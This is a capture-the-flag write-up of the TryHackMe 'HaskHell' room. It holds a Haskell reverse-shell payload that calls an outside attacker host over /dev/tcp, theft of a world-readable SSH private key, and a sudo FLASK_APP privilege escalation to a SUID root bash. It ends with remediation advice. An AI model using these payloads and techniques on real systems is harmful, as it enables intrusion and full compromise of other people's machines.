# HaskHell

Teach your CS professor that his PhD isn't in security.

Room: https://tryhackme.com/room/haskhell

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/haskhell.md

---

## Summary

HaskHell was a small web exploitation and Linux privilege escalation room. The target hosted a Python Flask application behind Gunicorn. The web app allowed students to upload Haskell homework files, which were then compiled and executed server-side.

By abusing this grading functionality, we gained command execution as the `flask` user. From there, we found a world-readable SSH private key for the `prof` user. After pivoting to `prof`, `sudo -l` showed that `prof` could run `flask run` as root while preserving the `FLASK_APP` environment variable. We used this to load a malicious Flask app as root and create a SUID root bash binary.

Attack path:

```text
Nmap -> Flask/Gunicorn web app -> Haskell upload grader RCE -> shell as flask
flask -> readable prof SSH key -> SSH as prof
prof -> sudo flask run with FLASK_APP preserved -> root
```

---

## Enumeration

Initial full port scan:

```bash
sudo nmap -sV -sC -p- --min-rate 5000 -oN nmap-sv-all.txt 10.64.164.153
```

Results:

```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
5001/tcp open  http    Gunicorn 19.7.1
```

Only SSH and a web service were exposed.

The web service was running on port `5001`:

```bash
curl -i http://10.64.164.153:5001/
```

The homepage showed a fake university-style programming course:

```html
<h1>Welcome to Functional Programming 220!</h1>
```

It mentioned Haskell and linked to the first homework assignment:

```html
<a href="/homework1">homework here</a>
```

---

## Web Application

Viewing `/homework1` showed the assignment instructions:

```bash
curl http://10.64.164.153:5001/homework1
```

Important details:

```text
Only Haskell files are accepted for uploads.
Your file will be compiled and ran and all output will be piped to a file under the uploads directory.
```

The page linked to `/upload`, but that route did not exist:

```bash
curl -i http://10.64.164.153:5001/upload
```

Response:

```text
HTTP/1.1 404 NOT FOUND
```

A working upload form was found at `/submit`:

```bash
curl http://10.64.164.153:5001/submit
```

The form accepted a file field named `file`:

```html
<form method=post enctype=multipart/form-data>
  <input type=file name=file>
  <input type=submit value=Upload>
</form>
```

---

## Testing File Upload

First, I tested a normal upload:

```bash
echo "test" > test.txt
curl -i -F "file=@test.txt" http://10.64.164.153:5001/submit
```

The app returned the same form, meaning `.txt` was not useful.

Next, I created a simple Haskell file:

```bash
cat > test.hs <<'EOF'
module Main where

main :: IO ()
main = do
  putStrLn "Garth was here"
  putStrLn "Testing Haskell execution"
EOF
```

Uploading the Haskell file to `/submit` worked:

```bash
curl -i -F "file=@test.hs" http://10.64.164.153:5001/submit
```

The server redirected to the uploaded file route:

```text
HTTP/1.1 302 FOUND
Location: http://10.64.164.153:5001/uploads/test.hs
```

This confirmed that `.hs` files were accepted.

---

## Foothold - Haskell Code Execution

Since the app compiled and ran uploaded Haskell files, I used Haskell's `System.Process` module to execute commands on the server.

Reverse shell payload:

```bash
cat > shell.hs <<'EOF'
module Main where

import System.Process

main :: IO ()
main = do
  callCommand "bash -c 'bash -i >& /dev/tcp/10.64.120.87/4444 0>&1'"
EOF
```

Started a listener:

```bash
nc -lvnp 4444
```

Uploaded the payload:

```bash
curl -i -F "file=@shell.hs" http://10.64.164.153:5001/submit
```

Then triggered the uploaded file:

```bash
curl -i http://10.64.164.153:5001/uploads/shell.hs
```

Received a shell:

```text
Connection received on 10.64.164.153
bash: cannot set terminal process group: Inappropriate ioctl for device
bash: no job control in this shell
flask@haskhell:~$
```

---

## Application Source Review

Inside `/home/flask`, the application source was readable:

```bash
ls
cat app.py
```

Relevant Flask code:

```python
upload_folder = '/home/flask/uploads'
allowed_extensions = {'hs'}
```

The upload route only allowed `.hs` files:

```python
def allowed_file(filename):
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in allowed_extensions
```

The vulnerable route was `/uploads/<filename>`:

```python
@app.route('/uploads/<filename>')
def uploaded_file(filename):
    results = open("/home/flask/uploads/" + filename + "_results.txt","w")

    for i in filename:
        if not i.isalpha() and i != ".":
            return '''
            <!doctype html>
            <title>Error</title>
            <h1>Internal Server Error. Please try again.
            '''

    subprocess.run(["ghc","--make","/home/flask/uploads/"+filename],stdout=results,stderr=results,stdin=results)
    subprocess.run(["/home/flask/uploads/"+filename.split(".")[0]],stdout=results,stderr=results,stdin=results)
    return send_from_directory(app.config['upload_folder'],filename+"_results.txt")
```

The filename filtering prevented simple filename command injection, but the app still compiled and executed attacker-controlled Haskell code.

That gave us code execution as the `flask` user.

---

## User Flag

Looking around the system, the `prof` home directory was accessible enough to read the user flag:

```bash
cd /home/prof
cat user.txt
```

User flag:

```text
flag{academic_d********}
```

---

## Pivot from flask to prof

Inside `/home/prof/.ssh`, the SSH private key was world-readable:

```bash
cd /home/prof/.ssh
ls -la
```

Permissions:

```text
-rw-r--r-- 1 prof prof 1679 id_rsa
```

Copied the private key to the attack box:

```bash
cat /home/prof/.ssh/id_rsa
```

Saved it locally as `prof_id_rsa`, then fixed permissions:

```bash
chmod 600 prof_id_rsa
```

SSH as `prof`:

```bash
ssh -i prof_id_rsa prof@10.64.164.153
```

Successful login:

```text
Welcome to Ubuntu 18.04.4 LTS
$
```

---

## Privilege Escalation

Checked sudo permissions as `prof`:

```bash
sudo -l
```

Output:

```text
Matching Defaults entries for prof on haskhell:
    env_reset, env_keep+=FLASK_APP, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User prof may run the following commands on haskhell:
    (root) NOPASSWD: /usr/bin/flask run
```

The important parts were:

```text
env_keep+=FLASK_APP
(root) NOPASSWD: /usr/bin/flask run
```

`prof` could run Flask as root, and sudo preserved the `FLASK_APP` environment variable.

This meant we could point `FLASK_APP` at a Python file we controlled. Flask imports the application file before starting the server, so top-level Python code would execute as root.

Created a malicious Flask app in `/tmp`:

```bash
cd /tmp

cat > app.py <<'EOF'
from flask import Flask
import os

os.system("cp /bin/bash /tmp/rootbash")
os.system("chmod 4755 /tmp/rootbash")

app = Flask(__name__)
EOF
```

Set `FLASK_APP`:

```bash
export FLASK_APP=/tmp/app.py
```

Ran Flask as root:

```bash
sudo /usr/bin/flask run
```

Flask started:

```text
* Serving Flask app "app"
* Running on http://127.0.0.1:5000/
```

Stopped it with `Ctrl+C`, then checked the SUID bash:

```bash
ls -la /tmp/rootbash
```

Result:

```text
-rwsr-xr-x 1 root root 1113504 /tmp/rootbash
```

Used the SUID bash to become root:

```bash
/tmp/rootbash -p
```

Confirmed root:

```bash
id
```

---

## Root Flag

```bash
cd /root
ls
cat root.txt
```

Root flag:

```text
flag{im_purely_f*********}
```

---

## Notes

The web foothold was not from exploiting Gunicorn directly. Gunicorn was just serving the Flask application.

The actual issue was insecure server-side grading:

```text
User uploads Haskell file
Server compiles it with ghc
Server executes compiled binary
Attacker controls the code being executed
```

The root privilege escalation came from a dangerous sudo rule:

```text
prof can run flask as root
FLASK_APP is preserved
prof controls the Flask app path
Flask imports attacker-controlled Python as root
```

This is a good reminder that allowing a user to run developer tools as root can be dangerous, especially when environment variables are preserved.

---

## Remediation Ideas

* Do not compile and execute untrusted user-submitted code directly on the host.
* Run code grading inside a locked-down sandbox or container.
* Use strict timeouts, resource limits, and no network access for graders.
* Do not expose private SSH keys with world-readable permissions.
* Avoid `env_keep` for risky variables like `FLASK_APP`.
* Do not allow users to run framework/developer tooling with sudo unless absolutely required.
* Use a dedicated restricted service account for grading tasks.
